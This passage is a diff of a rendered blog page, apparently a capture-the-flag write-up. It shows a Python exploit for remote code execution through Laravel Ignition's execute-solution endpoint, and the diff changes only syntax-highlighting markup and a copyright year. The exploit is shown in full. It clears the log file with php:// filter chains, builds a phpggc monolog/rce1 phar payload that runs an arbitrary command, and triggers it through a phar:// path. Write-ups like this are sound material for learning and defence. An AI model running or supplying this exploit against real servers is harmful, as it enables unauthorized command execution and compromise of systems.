-    <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">500</span> <span class="ow">and</span> <span class="s">'cannot be empty'</span> <span class="ow">in</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
-        <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r'\{(.|\n)+\}((.|\n)*)'</span><span class="p">,</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">resp</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">500</span> <span class="ow">and</span> <span class="s">'cannot be empty'</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">'\{(.|\n)+\}((.|\n)*)'</span><span class="p">,</span> <span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
         <span class="k">print</span><span class="p">()</span>
         <span class="k">print</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">])</span>
 
 <span class="k">def</span> <span class="nf">generate_payload</span><span class="p">(</span><span class="n">command</span><span class="o">=</span><span class="s">''</span><span class="p">,</span> <span class="n">padding</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
     <span class="k">if</span> <span class="s">'/'</span> <span class="ow">in</span> <span class="n">command</span><span class="p">:</span>
-        <span class="n">command</span> <span class="o">=</span> <span class="n">command</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'/'</span><span class="p">,</span> <span class="s">'</span><span class="err">\</span><span class="s">/'</span><span class="p">)</span>
-        <span class="n">command</span> <span class="o">=</span> <span class="n">command</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'</span><span class="se">\'</span><span class="s">'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\\'</span><span class="s">'</span><span class="p">)</span>
-    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">r'''php -d'phar.readonly=0' ./phpggc/phpggc monolog/rce1 system '</span><span class="si">%</span><span class="s">s' --phar phar -o php://output | base64 -w0 | sed -E 's/./\0=00/g' &gt; payload.txt'''</span><span class="o">%</span><span class="p">(</span><span class="n">command</span><span class="p">))</span>
+        <span class="n">command</span> <span class="o">=</span> <span class="n">command</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'/'</span><span class="p">,</span> <span class="s">'\/'</span><span class="p">)</span>
+        <span class="n">command</span> <span class="o">=</span> <span class="n">command</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'</span><span class="se">\'</span><span class="s">'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\\'</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="sa">r</span><span class="s">'''php -d'phar.readonly=0' ./phpggc/phpggc monolog/rce1 system '%s' --phar phar -o php://output | base64 -w0 | sed -E 's/./\0=00/g' &gt; payload.txt'''</span><span class="o">%</span><span class="p">(</span><span class="n">command</span><span class="p">))</span>
     <span class="n">payload</span> <span class="o">=</span> <span class="s">''</span>
     <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'payload.txt'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span>
-        <span class="n">payload</span> <span class="o">=</span> <span class="n">fp</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-        <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'=='</span><span class="p">,</span> <span class="s">'=3D='</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">fp</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'=='</span><span class="p">,</span> <span class="s">'=3D='</span><span class="p">)</span>
         <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">padding</span><span class="p">):</span>
             <span class="n">payload</span> <span class="o">+=</span> <span class="s">'=00'</span>
-    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'rm -rf payload.txt'</span><span class="p">)</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'rm -rf payload.txt'</span><span class="p">)</span>
     <span class="k">return</span> <span class="n">payload</span>
 
 
 <span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
 
-    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="s">'Usage:  </span><span class="si">%</span><span class="s">s url path-log command</span><span class="se">\n</span><span class="s">'</span><span class="o">%</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
-        <span class="k">print</span><span class="p">(</span><span class="s">'</span><span class="se">\t</span><span class="s">Ex: </span><span class="si">%</span><span class="s">s http(s)://pwnme.me:8000 /var/www/html/laravel/storage/logs/laravel.log </span><span class="se">\'</span><span class="s">id</span><span class="se">\'</span><span class="s">'</span><span class="o">%</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'Usage:  %s url path-log command</span><span class="se">\n</span><span class="s">'</span><span class="o">%</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'</span><span class="se">\t</span><span class="s">Ex: %s http(s)://pwnme.me:8000 /var/www/html/laravel/storage/logs/laravel.log </span><span class="se">\'</span><span class="s">id</span><span class="se">\'</span><span class="s">'</span><span class="o">%</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
         <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
-    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="s">'./phpggc/phpggc'</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">isfile</span><span class="p">(</span><span class="s">'./phpggc/phpggc'</span><span class="p">):</span>
         <span class="k">print</span><span class="p">(</span><span class="s">'Phpggc not found!'</span><span class="p">)</span>
         <span class="k">print</span><span class="p">(</span><span class="s">'Run command: git clone https://github.com/ambionics/phpggc.git'</span><span class="p">)</span>
-        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'git clone https://github.com/ambionics/phpggc.git'</span><span class="p">)</span>
+        <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'git clone https://github.com/ambionics/phpggc.git'</span><span class="p">)</span>
 
-    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-    <span class="n">path_log</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
-    <span class="n">command</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">path_log</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+    <span class="n">command</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
     <span class="n">padding</span> <span class="o">=</span> <span class="mi">0</span>
 
     <span class="n">payload</span> <span class="o">=</span> <span class="n">generate_payload</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">padding</span><span class="p">)</span>
@@ -859,17 +859,17 @@ Service detection performed. Please report any incorrect results at https://nmap
         <span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="o">+</span><span class="s">'/_ignition/execute-solution'</span>
 
     <span class="k">print</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">Exploit...'</span><span class="p">)</span>
-    <span class="n">clear_log</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">'php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=</span><span class="si">%</span><span class="s">s'</span><span class="o">%</span><span class="p">(</span><span class="n">path_log</span><span class="p">))</span>
+    <span class="n">clear_log</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">'php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s'</span><span class="o">%</span><span class="p">(</span><span class="n">path_log</span><span class="p">))</span>
     <span class="n">create_payload</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">'AA'</span><span class="p">)</span>
     <span class="n">create_payload</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
-    <span class="k">while</span> <span class="p">(</span><span class="ow">not</span> <span class="n">convert</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">'php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=</span><span class="si">%</span><span class="s">s'</span><span class="o">%</span><span class="p">(</span><span class="n">path_log</span><span class="p">))):</span>
-        <span class="n">clear_log</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">'php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=</span><span class="si">%</span><span class="s">s'</span><span class="o">%</span><span class="p">(</span><span class="n">path_log</span><span class="p">))</span>
+    <span class="k">while</span> <span class="p">(</span><span class="ow">not</span> <span class="n">convert</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">'php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=%s'</span><span class="o">%</span><span class="p">(</span><span class="n">path_log</span><span class="p">))):</span>
+        <span class="n">clear_log</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">'php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s'</span><span class="o">%</span><span class="p">(</span><span class="n">path_log</span><span class="p">))</span>
         <span class="n">create_payload</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">'AA'</span><span class="p">)</span>
         <span class="n">padding</span> <span class="o">+=</span> <span class="mi">1</span>
         <span class="n">payload</span> <span class="o">=</span> <span class="n">generate_payload</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">padding</span><span class="p">)</span>
         <span class="n">create_payload</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 
-    <span class="n">exploited</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">'phar://</span><span class="si">%</span><span class="s">s'</span><span class="o">%</span><span class="p">(</span><span class="n">path_log</span><span class="p">))</span>
+    <span class="n">exploited</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">'phar://%s'</span><span class="o">%</span><span class="p">(</span><span class="n">path_log</span><span class="p">))</span>
 
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
     <span class="n">main</span><span class="p">()</span>
@@ -999,7 +999,7 @@ Service detection performed. Please report any incorrect results at https://nmap
   </ul>
 </div>
 
-<div class="page__footer-copyright">© 2022 bynafrez08.io</div>
+<div class="page__footer-copyright">© 2025 bynafrez08.io</div>
 
       </footer>
     </div>
